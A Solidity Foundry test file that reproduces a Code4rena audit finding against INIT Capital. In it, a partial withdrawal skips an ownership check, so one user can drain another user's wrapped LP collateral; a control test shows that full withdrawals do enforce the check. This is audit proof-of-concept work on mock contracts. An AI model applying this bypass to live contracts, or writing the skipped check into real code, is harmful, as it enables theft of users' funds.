// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./29590-h-02-wlp-tokens-could-be-stolen-code4rena-init-capital-init.sol";

/*//////////////////////////////////////////////////////////////
    INIT Capital — [H-02] wLp tokens could be stolen. Finding
    #29590 (code4rena, sashik_eth) — HIGH.
//////////////////////////////////////////////////////////////*/
contract WLpTheftTest is Test {
    MockToken lpToken;
    MockWrapLp wLp;
    PosManagerVuln posManager;

    uint256 constant BOB_POS_ID = 1;
    uint256 constant ALICE_POS_ID = 2;
    uint256 constant BOB_TOKEN_ID = 1;
    uint256 constant ALICE_TOKEN_ID = 2;
    uint256 constant VICTIM_AMT = 100_000_000;

    address constant BOB = address(0xB0B);
    address constant ALICE = address(0xA11CE);

    function setUp() public {
        posManager = new PosManagerVuln();
        lpToken = new MockToken();
        wLp = new MockWrapLp(address(posManager), lpToken);
    }

    /// @notice CONTROL: a FULL withdrawal (newWLpAmt == 0) DOES enforce the
    ///         ownership check and reverts when the caller's posId does not
    ///         hold the tokenId. This proves the guard exists and works — it
    ///         is only the PARTIAL-withdrawal path that skips it.
    function test_control_fullWithdrawal_enforcesOwnership() public {
        wLp.mintTo(BOB_TOKEN_ID, VICTIM_AMT);
        posManager.addCollateralWLp(BOB_POS_ID, address(wLp), BOB_TOKEN_ID);

        wLp.mintTo(ALICE_TOKEN_ID, 1);
        posManager.addCollateralWLp(ALICE_POS_ID, address(wLp), ALICE_TOKEN_ID);

        // Alice tries to withdraw the FULL amount of Bob's wLp using her own
        // posId -> newWLpAmt == 0 -> ownership check runs -> reverts.
        vm.expectRevert("NOT_CONTAIN");
        posManager.removeCollateralWLpTo(ALICE_POS_ID, address(wLp), BOB_TOKEN_ID, VICTIM_AMT, ALICE);
    }

    /// @notice HARM: a PARTIAL withdrawal (1 wei short of full) skips the
    ///         ownership check entirely — Alice drains almost all of Bob's
    ///         collateral using only her own position id.
    function test_wLpTheft_partialWithdrawalBypassesOwnershipCheck() public {
        Exploit exploit = new Exploit();
        exploit.run();

        MockToken token = exploit.lpToken();
        assertEq(token.balanceOf(exploit.ALICE()), VICTIM_AMT - 1, "Alice should hold Bob's stolen collateral");
        assertEq(token.balanceOf(exploit.BOB()), 0, "Bob never received or held any LP token directly");
    }
}
